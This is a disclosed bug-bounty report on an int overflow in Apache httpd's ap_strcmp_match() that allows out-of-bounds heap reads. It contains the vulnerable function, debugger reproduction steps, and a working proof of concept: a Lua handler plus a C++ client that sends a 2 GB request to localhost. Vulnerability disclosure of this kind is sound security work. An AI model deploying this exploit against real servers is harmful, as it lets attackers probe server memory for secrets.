# Read beyond bounds in ap_strcmp_match() [zhbug_httpd_47.7]

## Report Details
- **Report ID**: 1595281
- **URL**: https://hackerone.com/reports/1595281
- **State**: Closed
- **Severity**: low
- **Submitted**: 2022-06-08T22:35:23.942Z
- **Disclosed**: 2022-07-09T13:39:43.348Z

## Reporter
- **Username**: tdp3kel9g
- **Name**: N/A

## Team
- **Name**: N/A
- **Handle**: ibb

## Vulnerability Information
Greetings. I have found a read-beyond-bounds attack against httpd that allows an attacker to search httpd's memory for strings matching an attacker-specified pattern [1]. The attack arises from an overflow in ap_strcmp_match() (server/util.c). [2] The vulnerability can be reached via an LUA program that uses r:strcmp_match() on a long-enough attacker-provided string, and possibly via other means.

Attached is a POC that demonstrates the bug.

The buggy code (from trunk) is the entire function, which uses |int| instead of |apr_size_t| to index a string that can be longer than the maximum positive value of an |int|:
```
187: AP_DECLARE(int) ap_strcmp_match(const char *str, const char *expected)
188: {
189:     int x, y;
190:
191:     for (x = 0, y = 0; expected[y]; ++y, ++x) {
192:         if (expected[y] == '*') {
193:             while (expected[++y] == '*');
194:             if (!expected[y])
195:                 return 0;
196:             while (str[x]) {
197:                 int ret;
198:                 if ((ret = ap_strcmp_match(&str[x++], &expected[y])) != 1)
199:                     return ret;
200:             }
201:             return -1;
202:         }
203:         else if (!str[x])
204:             return -1;
205:         else if ((expected[y] != '?') && (str[x] != expected[y]))
206:             return 1;
207:     }
208:     return (str[x] != '\0');
209: }
```
Thus, the increments of |x| (and also |y|; not demonstrated here) can overflow from `0x7fffffff` (positive) to `0x80000000` et seq (negative), which causes references to |str[x]| to examine memory from `0x80000000` bytes *before* the beginning of |str| forward. The attached POC demonstrates this issue.

To use the POC:

   1. Build bug_client.cpp.
   2. Copy bug_47.7.1.lua into folder /bug47.7/bug47.7.1.lua .
   3. Start httpd (with LUA enabled), attach a debugger to it, and set a BP on ap_strcmp_match().
   4. Run bug_client.cpp.
   5. When the BP fires, step to line 196. Set a conditional breakpoint on this line for when x > `0x7fffffff` and proceed (this can take a long time, so you might instead try proceeding then quickly breaking execution and checking the value of |x|, iterating until it's reasonable to set the conditional breakpoint).
   6. When the conditional BP fires, observe that line 196 references |str-0x80000000|, as does line 198. Step several more times and watch the code march upward toward |str|. On a busy system, these locations are likely to contain heap data. On an idle system they could be inaccessible.

[1] The attacker cannot retrieve that matching strings, only determine whether they exist.
[2] The same bug also exists in ap_strcasecmp_match().

```
-------- bug47.7.1.lua ----------------------------------------------------
function handle(r)
   local s=r:requestbody()
   local m=r.strcmp_match(s, "*secret*")
   if m then
      r:puts("Found a 'secret'")
   end
end
-------- bug47.7.1.lua ----------------------------------------------------
```
```
-------- bug_client.cpp ----------------------------------------------------
#define DO_BUG_47_7

#undef UNICODE

#define WIN32_LEAN_AND_MEAN
#define _CRT_SECURE_NO_WARNINGS

#include <windows.h>
#include <winsock2.h>
#include <ws2tcpip.h>
#include <stdlib.h>
#include <stdio.h>

#pragma comment (lib, "Ws2_32.lib")
#pragma warning (disable:6262)
constexpr char SERVER_NAME[] = "127.0.0.1";

void FillBuffer(
    const char *pInput,
    char *pOutput,
    size_t numOutputBytes) {

    char *pEnd = pOutput + numOutputBytes;
    size_t inlen = strlen(pInput);
    while (pOutput < pEnd) {
        size_t numBytes = min(inlen, static_cast <size_t> (pEnd - pOutput));
        memcpy(pOutput, pInput, numBytes);
        pOutput += inlen;
    }
}

int ConnectSocket(const addrinfo* pAddrInfo, SOCKET* pSocket) {
    int iResult;
    *pSocket = socket(pAddrInfo->ai_family, pAddrInfo->ai_socktype, pAddrInfo->ai_protocol);
    if (*pSocket == INVALID_SOCKET) {
        printf("socket failed with error: %ld\n", WSAGetLastError());
        return SOCKET_ERROR;
    }

    iResult = connect(*pSocket, pAddrInfo->ai_addr, static_cast<int>(pAddrInfo->ai_addrlen));
    return iResult;
}

int __cdecl main(void)
{
    WSADATA wsaData;
    int iResult;

    SOCKET serverSocket = INVALID_SOCKET;

    struct addrinfo* result = NULL;
    struct addrinfo hints;

// Initialize Winsock

    iResult = WSAStartup(MAKEWORD(2, 2), &wsaData);
    if (iResult != 0) {
        printf("WSAStartup failed with error: %d\n", iResult);
        return 1;
    }

    ZeroMemory(&hints, sizeof(hints));
    hints.ai_family = AF_INET;
    hints.ai_socktype = SOCK_STREAM;
    hints.ai_protocol = IPPROTO_TCP;
//    hints.ai_flags = AI_PASSIVE;

// Resolve the server's address and port

    iResult = getaddrinfo(SERVER_NAME, "80", &hints, &result);
    if (iResult != 0) {
        printf("getaddrinfo failed with error: %d\n", iResult);
        WSACleanup();
        return 1;
    }

    iResult = ConnectSocket(result, &serverSocket);

    if (iResult == SOCKET_ERROR) {
        if (serverSocket != INVALID_SOCKET) {
            closesocket(serverSocket);
        }
        freeaddrinfo(result);
        WSACleanup();
        return 1;
    }

#ifdef DO_BUG_47_7
    char req1[] =
        "POST /bug47.7/bug47.7.1.lua HTTP/1.1\r\n"
        "Host: 127.0.0.1\r\n"
        "Accept: text/html\r\n"
        "Content-Type: application/x-www-form-urlencoded\r\n"
        "Content-Length: 2147483648\r\n"
        "Connection: close\r\n\r\n";

    const size_t sz = 2147483648ui64 + sizeof(req1) + 2; // for ending \n and 0
    char* pReq1 = new char[sz];
    memcpy(pReq1, req1, strlen(req1));
    memset(&pReq1[strlen(req1)], 'a', sz - strlen(req1));
    pReq1[sz - 2] = '\n';
    pReq1[sz - 1] = 0;

#endif

    WSABUF w;
    ULONG firstBatch = static_cast<ULONG>(min(sz,0x40000000));
    w.buf = pReq1; w.len = firstBatch;
    DWORD bytesSent = 0;

    iResult = WSASend(serverSocket, &w, 1, &bytesSent, 0, NULL, NULL);
    if (iResult == SOCKET_ERROR) {
        closesocket(serverSocket);
        freeaddrinfo(result);
        WSACleanup();
        return 1;
    }

    Sleep(1000);

    if (firstBatch < sz) {
        w.buf = pReq1 + firstBatch;
        w.len = static_cast<ULONG>(sz - firstBatch);
        iResult = WSASend(serverSocket, &w, 1, &bytesSent, 0, NULL, NULL);
        if (iResult == SOCKET_ERROR) {
            closesocket(serverSocket);
            freeaddrinfo(result);
            WSACleanup();
            return 1;
        }
    }

// Receive and throw away the response.

    char recvBuf[65536];

    iResult = recv(serverSocket, recvBuf, sizeof(recvBuf), 0);
    closesocket(serverSocket);

// The bug has been triggered. Cleanup and exit.

    closesocket(serverSocket);
    freeaddrinfo(result);
    WSACleanup();

    return 0;
}
-------- bug_client.cpp ---------------------------------------------------- 
```

## Impact

The attacker could search ~ `0x80000000` bytes of beyond-bounds heap for the existence of a given string. In mitigation, the target httpd must be running a compatible lua program. Such a program must permit the attacker to upload or otherwise cause httpd to use an lua string that is `0x80000000` bytes long or longer, and must search for a string (that can be binary) that is useful to the attacker. This could occur if the lua program allowed the client (attacker in this case) to specify the string to be searched.

## Attachments
No attachments
